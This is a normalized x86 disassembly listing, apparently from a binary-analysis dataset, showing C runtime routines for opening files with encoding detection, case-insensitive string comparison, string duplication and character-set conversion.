jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_4119e1
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
cmp esi ebx
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_4119e1
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_4119bb
mov [ eax ] 0xd
jmp r-xdata
and [ ebp - 0x8 ] 0x7fffffff
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x34 ]
push [ ebp - 0x14 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ esi ]
call sub_41b4a7
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
mov [ eax ] cl
cmp [ ebp - 0x3 ] bl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov edi [ ebp - 0x8 ]
mov eax 0xc0000000
mov ecx edi
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x20 ]
and eax edi
jne r-xdata
push 0x2
or edi 0xffffffff
push edi
push [ esi ]
call sub_41bf5f
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp eax edi
jne r-xdata
mov eax ebx
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x24 ]
push eax
push [ esi ]
mov [ ebp - 0x24 ] ebx
call sub_41ad02
add esp 0xc
test eax eax
jne r-xdata
call sub_4119ce
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x34 ]
push 0x3
push eax
push [ ebp - 0x10 ]
and edi 0x7fffffff
push edi
push [ ebp + 0xc ]
call [ CreateFileW@IAT ]
cmp eax 0xffffffff
jne r-xdata
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x18 ] ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push ebx
push ebx
push [ esi ]
call sub_41bf5f
add esp 0xc
cmp eax edi
je r-xdata
cmp [ ebp - 0x24 ] 0x1a
jne r-xdata
push [ esi ]
call sub_41b886
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_4119e1
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_41b528
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
push [ esi ]
call sub_420654
add esp 0xc
cmp eax edi
je r-xdata
pop ecx
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x18 ]
push eax
push [ esi ]
call sub_41ad02
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x18 ] 0xbfbbef
mov [ ebp - 0x14 ] 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_42034c
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x18 ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp [ ebp - 0x14 ] edi
jg r-xdata
mov [ ebp - 0x18 ] 0xfeff
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_42034c
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_41b886
pop ecx
call sub_4119bb
push 0x16
pop esi
mov [ eax ] esi
push ebx
push ebx
push [ esi ]
call sub_41bf5f
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x18 ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax [ ebp - 0x14 ]
sub eax edi
push eax
lea eax [ ebp + edi - 0x18 ]
push eax
push [ esi ]
call sub_41e7c0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push 0x2
push [ esi ]
call sub_41bf5f
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_42034c
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_42034c
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_422ca5
push 0x14
push r--data
call sub_4183f0
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0x18 ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
or [ edi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
je r-xdata
call sub_4119bb
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_41897d
add esp 0x14
mov eax edi
jmp r-xdata
cmp [ ebp + 0x1c ] esi
je r-xdata
call sub_418435
retn
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_422585
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_422d43
mov eax [ ebp - 0x20 ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ edi ] 0xffffffff
sub_422d43
cmp [ ebp - 0x1c ] esi
je r-xdata
retn
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ edi ]
call sub_41b6c5
pop ecx
mov eax [ edi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_422d71
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_422ca5
add esp 0x18
pop ebp
retn
sub_422d94
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_422db4
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_411f81
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_422df9
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_422df9
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_422db4
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_422ea9
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_422ec8
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_422ea9
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_422ecb
push 0xc
push r--data
call sub_4183f0
push 0xe
call sub_419f99
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_422f32
call sub_418435
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_4121b5
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_4121b5
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_422f3b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
pop ebx
leave
retn
push esi
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_415547
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
cmp ecx ebx
jne r-xdata
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
jmp r-xdata
pop edi
push [ eax + 0x8 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push 0x1001
push ecx
push eax
call sub_424a47
add esp 0x20
cmp eax ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
cmp ax 0x41
jb r-xdata
mov eax esi
jmp r-xdata
add eax 0xfffffffe
call sub_4119bb
mov [ eax ] 0x16
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx ax
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
add [ ebp + 0x8 ] 0x2
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
movzx eax cx
sub eax edx
jmp r-xdata
cmp cx bx
je r-xdata
add eax 0x20
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp cx ax
je r-xdata
sub_42307e
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_422f3b
add esp 0x10
mov ebx [ ebp + 0x8 ]
cmp ebx edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx edi
je r-xdata
call sub_4119bb
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop edi
pop ebx
pop ebp
retn
movzx eax [ ebx ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax [ edx ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
inc ebx
inc ebx
inc edx
inc edx
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
movzx eax cx
sub eax edx
jmp r-xdata
cmp cx di
je r-xdata
add eax 0x20
cmp cx ax
je r-xdata
sub_423122
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_411794
mov esi eax
inc esi
push 0x2
push esi
call sub_41d208
mov edi eax
add esp 0xc
cmp edi ebx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push [ ebp + 0x8 ]
push esi
push edi
call sub_420230
add esp 0xc
test eax eax
je r-xdata
pop ebx
pop ebp
retn
mov eax edi
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_418855
add esp 0x14
pop edi
pop esi
sub_42317a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rw-data ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov eax [ esi ]
push edi
cmp eax ebx
je r-xdata
xor eax eax
mov edi [ MultiByteToWideChar@IAT ]
or eax 0xffffffff
jmp r-xdata
push 0x2
push eax
call sub_4186b7
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x8 ]
push eax
push 0xffffffff
push [ esi ]
push ebx
push ebx
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_4121b5
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push ebx
push eax
call sub_41c8b7
pop ecx
pop ecx
test eax eax
jl r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
add esi 0x4
mov eax [ esi ]
cmp eax ebx
jne r-xdata
push ebx
push ebx
push 0xffffffff
push eax
push ebx
push ebx
call edi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
sub_423201
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_412e40
mov esi eax
inc esi
push esi
call sub_412584
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push [ ebp + 0x8 ]
push esi
push edi
call sub_41cf11
add esp 0xc
test eax eax
je r-xdata
pop ebx
pop ebp
retn
mov eax edi
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_418855
add esp 0x14
pop edi
pop esi
sub_423256
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
jne r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
dec ecx
mov eax [ ebp + 0x8 ]
sub eax ecx
dec eax
pop ebp
retn
inc eax
sub_423274
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
push esi
push edi
xor edi edi
mov ebx edx
mov esi ecx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
push 0x1
mov eax r--data
push eax
push 0x1
push eax
push edi
push edi
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jge r-xdata
push [ ebp + 0x10 ]
mov eax ebx
call sub_423256
pop ecx
mov [ ebp + 0x10 ] eax
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov edx [ ebp + 0x18 ]
cmp edx edi
jle r-xdata
xor eax eax
jmp r-xdata
cmp edx 0xffffffff
jl r-xdata
mov eax [ ebp - 0x1c ]
push edx
call sub_423256
mov edx eax
pop ecx
mov [ ebp + 0x18 ] edx
jmp r-xdata
mov [ rw-data ] 0x2
lea esp [ ebp - 0x38 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
leave
retn
mov ecx [ rw-data ]
cmp ecx 0x2
je r-xdata
xor edi edi
xor ebx ebx
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp ecx edi
je r-xdata
cmp [ ebp + 0x1c ] edi
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
xor eax eax
inc eax
cmp ecx eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_424ac3
mov esi eax
pop ecx
cmp esi 0xffffffff
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov [ ebp - 0x28 ] edi
cmp [ ebp + 0x1c ] edi
jne r-xdata
cmp esi [ ebp + 0x1c ]
je r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov [ ebp + 0x1c ] ecx
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
mov esi eax
test ebx ebx
je r-xdata
push 0x0
push 0x0
lea eax [ ebp + 0x10 ]
push eax
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x1c ]
call sub_424b0c
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
cmp edx edi
jne r-xdata
mov eax esi
push ebx
call sub_4121b5
push edi
call sub_4121b5
pop ecx
pop ecx
push 0x0
push 0x0
lea eax [ ebp + 0x18 ]
push eax
push [ ebp - 0x1c ]
push esi
push [ ebp + 0x1c ]
call sub_424b0c
mov edi eax
add esp 0x18
test edi edi
jne r-xdata
cmp edx eax
jg r-xdata
push 0x2
mov esi [ MultiByteToWideChar@IAT ]
push edi
push edi
push [ ebp + 0x10 ]
push ebx
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
cmp ebx edi
je r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] edi
push ebx
call sub_4121b5
pop ecx
jmp r-xdata
cmp [ ebp + 0x10 ] eax
jle r-xdata
mov edi 0x400
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x1c ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
push 0x3
jmp r-xdata
and [ ebp - 0x20 ] 0x0
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
pop eax
jmp r-xdata
push ebx
push [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
cmp [ ebp + 0x18 ] edi
jle r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
push [ ebp - 0x20 ]
call sub_416223
mov eax [ ebp - 0x28 ]
pop ecx
jmp r-xdata
push 0x0
push 0x0
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push eax
call sub_412584
pop ecx
test eax eax
je r-xdata
call sub_420320
mov eax esp
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x2
jae r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
jle r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
add eax 0x8
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
mov cl [ ebx ]
cmp cl [ eax ]
jb r-xdata
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
mov ecx [ ebp - 0x1c ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
push edi
call sub_416223
pop ecx
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x20 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
mov [ ebp - 0x28 ] eax
push eax
call sub_412584
pop ecx
test eax eax
je r-xdata
call sub_420320
mov edi esp
test edi edi
je r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
jmp r-xdata
test edi edi
je r-xdata
sub_4235e4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_415547
push [ ebp + 0x24 ]
mov edx [ ebp + 0x14 ]
push [ ebp + 0x20 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_423274
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_423626
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_415547
mov edx [ ebp + 0x10 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp edx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
cmp ecx ebx
jne r-xdata
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
jmp r-xdata
push [ eax + 0x8 ]
lea eax [ ebp - 0x10 ]
push edx
push [ ebp + 0xc ]
push edx
push [ ebp + 0x8 ]
push 0x1001
push ecx
push eax
call sub_4235e4
add esp 0x20
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_424cc0
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
call sub_4119bb
mov [ eax ] 0x16
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_423720
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_415547
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_4119bb
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_41897d
add esp 0x14
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_4119bb
mov [ eax ] 0x2a
call sub_4119bb
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_4119bb
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_41897d
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
